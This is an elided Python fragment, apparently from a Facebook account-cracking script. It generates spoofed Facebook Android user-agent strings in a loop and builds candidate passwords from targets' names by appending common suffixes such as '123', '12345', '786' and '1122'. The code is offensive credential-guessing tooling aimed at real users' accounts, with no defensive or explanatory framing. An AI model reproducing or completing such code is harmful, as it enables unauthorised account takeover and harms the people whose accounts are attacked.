...
for z in range(200):
	...
	ua = f"Dalvik/2.1.0 (Linux; U; Android {android}; {SLR} Build/TP1A.220624.014; wv) [FBAN/FB4A;FBAV/{versi_chrome};FBBV/{versi_app};FBRV/0;FBLC/id_ID;FBMF/Samsung;FBBD/Samsung;FBDV/{SLR};FBSV/{android};FBCA/"+"x86_64:x86:arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=1.5,width=1600,height=900}"+";FB_FW/1;]"
	if ua in ugent:pass
					...
					try:
						...
						if len(nama)<=5:
							if len(depan)<3:
								...
								pwx.append(full+"123")
								pwx.append(full+"12345")
								pwx.append(full+"786")
								pwx.append(full+"1122")
						else:
							if len(depan)<3:
								pwx.append(nama)
							else:
